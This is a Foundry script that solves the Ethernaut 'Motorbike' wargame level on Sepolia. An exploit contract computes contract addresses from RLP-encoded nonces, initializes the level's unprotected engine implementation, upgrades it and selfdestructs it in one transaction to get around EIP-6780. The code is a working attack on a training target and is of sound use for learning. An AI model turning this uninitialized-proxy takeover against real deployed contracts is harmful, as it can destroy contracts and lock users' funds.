// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {HelperConfig} from "../HelperConfig.s.sol";
import {Level} from "src/Level.sol";
import {Vm} from "forge-std/Vm.sol";

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address, bytes memory) external payable;
}

interface Factory {
    function createInstance(address _player) external payable returns (address);
    function validateInstance(address payable _instance, address _player) external returns (bool);
}

// @note Initially, the exploit of this level is somewhat simple. However, since the Dencun hard fork introduced the "EIP-6780: SELFDESTRUCT only in the same transaction" https://eips.ethereum.org/EIPS/eip-6780, this level cannot be resolved anymore. At least not with the usual EOA wallet. Check discussion : https://github.com/OpenZeppelin/ethernaut/issues/701
// The only way to resolve this level now is to create the instance and call selfdestruct in the same transaction.
// But to have both of these operation in the same tx, the only way to pull this off is to use a contract. So by extension, the address that would complete this level would be the contract's address.

// First thing first, we need to find a way to recover the instance and the engine addresses. Using vm cheatcodes won't work here since we will use a contract and not a script. However, the AddressHelper allow us to do just that : compute the address of the deployed contracts using rlp_encoding rules on the deployer address and the nonce. According to the yellowpaper, a contract address is "The address of the new account is defined as being the
// rightmost 160 bits of the Keccak-256 hash of the RLP
// encoding of the structure containing only the sender and
// the account nonce.

// The AddressHelper code has been inspired from the work of https://github.com/Ching367436/ethernaut-motorbike-solution-after-decun-upgrade/tree/main

contract AddressHelper {
    function getNonce(address _addr) public view returns (uint256 nonce) {
        for (;; nonce = nonce + 1) {
            address contractAddress = computeCreateAddress(_addr, nonce);
            if (!isContract(contractAddress)) return nonce;
        }
    }

    function isContract(address _addr) public view returns (bool) {
        // https://ethereum.stackexchange.com/questions/15641/how-does-a-contract-find-out-if-another-address-is-a-contract
        uint32 size;
        assembly {
            size := extcodesize(_addr)
        }
        return (size > 0);
    }

    function computeCreateAddress(address deployer) external view returns (address) {
        uint256 nonce = getNonce(deployer);
        return computeCreateAddress(deployer, nonce);
    }

    // The code below is adapted from https://github.com/OoXooOx/Predict-smart-contract-address/blob/main/AddressPredictorCreateOpcode.sol
    function addressFromLast20Bytes(bytes32 bytesValue) private pure returns (address) {
        return address(uint160(uint256(bytesValue)));
    }

    function computeCreateAddress(address deployer, uint256 nonce) public pure returns (address) {
        // forgefmt: disable-start
        // @note According the yellowpaper, if the byte-array contains fewer than 56 bytes, then the output is equal to the input prefixed by the byte equal to the length of the byte array plus 128
        // If RLP is used to encode a scalar, defined only as a positive integer (P or any x for Px), it must be specified as the shortest byte array such that the big-endian interpretation of it is equal
        // The last one tells that leading zero bytes needs to be trimmed from big-endian representation of scalar values.
        // Scalar 0 is a special case - big-endian interpretation of 0 consists of zeros - so after trimming, we get empty byte array. Empty byte array has length < 56, so it's length is encoded as 0+128 which is 0x80 in hex.
        // Thus, the integer zero is treated as an empty byte string, and as a result it only has a length prefix, 0x80, computed via 0x80 + 0. 
        // A one byte integer uses its own value as its length prefix, there is no additional "0x80 + length" prefix that comes before it.
        if (nonce == 0x00)      return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, bytes1(0x80))));
        if (nonce <= 0x7f)      return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, uint8(nonce))));

        // Nonces greater than 1 byte all follow a consistent encoding scheme, where each value is preceded by a prefix of 0x80 + length.
        if (nonce <= 2**8 - 1)  return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd7), bytes1(0x94), deployer, bytes1(0x81), uint8(nonce)))); // nonce > 128 but has 1 byte
        if (nonce <= 2**16 - 1) return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd8), bytes1(0x94), deployer, bytes1(0x82), uint16(nonce)))); // nonce has 2 bytes
        if (nonce <= 2**24 - 1) return addressFromLast20Bytes(keccak256(abi.encodePacked(bytes1(0xd9), bytes1(0x94), deployer, bytes1(0x83), uint24(nonce))));// nonce has 3 bytes
        // forgefmt: disable-end

        // More details about RLP encoding can be found here: https://eth.wiki/fundamentals/rlp
        // 0xda = 0xc0 (short RLP prefix) + 0x16 (length of: 0x94 ++ proxy ++ 0x84 ++ nonce)
        // 0x94 = 0x80 + 0x14 (0x14 = the length of an address, 20 bytes, in hex)
        // 0x84 = 0x80 + 0x04 (0x04 = the bytes length of the nonce, 4 bytes, in hex)
        // We assume nobody can have a nonce large enough to require more than 32 bits.
        // Assume max value of nonce is 2**32 - 1 = 4294967295
        return addressFromLast20Bytes(
            keccak256(abi.encodePacked(bytes1(0xda), bytes1(0x94), deployer, bytes1(0x84), uint32(nonce)))
        );
    }
}

// The exploit contract will be used as the intermediary that will call both the instance creation and engine destruction in one single transaction.

contract Exploit is AddressHelper {
    address public motorbike;

    function createLevelInstanceAndDestroyEngine(
        address _factory,
        address ethernaut,
        uint256 nonce
    ) external {
        // Create a new instance then recover the address using AddressHelper 
        Ethernaut(ethernaut).createLevelInstance(Level(_factory));
        // We use computeCreateAddress with a known nonce rather than computeCreateAddress(address deployer). A nonce can be very big and so the call gas value. It could even revert the tx.
        address engine = computeCreateAddress(_factory, nonce);
        motorbike = computeCreateAddress(_factory, nonce + 1);

        IEngine engineContract = IEngine(engine);

        engineContract.initialize();
        engineContract.upgradeToAndCall(address(this), abi.encodeWithSelector(this.destruction.selector));

    }
    function destruction() external {
        selfdestruct(payable(address(0)));
    }

    function submitLevelInstance(address ethernaut, address instanceAddress) external {
        // Submit results without checking if completed
        Ethernaut(ethernaut).submitLevelInstance(payable(instanceAddress));
        (,, bool completed) = Ethernaut(ethernaut).emittedInstances(instanceAddress);

        // @note This will always revert if it is not commented. Probably because selfdestruct takes effect only after all tx are submitted and mined. And foudry does this check before, so completed will be false. However, if it is commented, it works. 
        // require(completed == true, "Solution is not solving the level");
    }
}

// Now for the script

// @note Right now, the address that resolves this level is the Exploit contract address. In the future, with the introduction of the https://eips.ethereum.org/EIPS/eip-7702, it will allow an EOA to have code, and for transactions initiated by the EOA to have msg.sender equal to tx.origin even within contract calls. The usual EOA will thus be the one resolving this level.

contract MotorbikeExploit is Script {
    address public levelFactory;
    // HelperConfig public config;

    function run() external {

        levelFactory = vm.envAddress("LEVEL25_SEPOLIA_ADDRESS");
        address ethernaut = vm.envAddress("ETHERNAUT_SEPOLIA_ADDRESS");

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Exploit exploit = new Exploit();
        // We call cast nonce $LEVEL25_SEPOLIA_ADDRESS -r $SEPOLIA_RPC_URL to get the current nonce value on sepolia. Current nonce = 3201
        exploit.createLevelInstanceAndDestroyEngine(levelFactory, ethernaut, 3201);

        // @note // selfdestruct doesn't take effect until the call is over. The submitLevelInstance needs to be called seperately rather than in the same tx as createLevelInstanceAndDestroyEngine because the factory applies the following check : !Address.isContract which will only give the correct result when tx is mined.
        exploit.submitLevelInstance(ethernaut, exploit.motorbike());

        vm.stopBroadcast();
    }
}
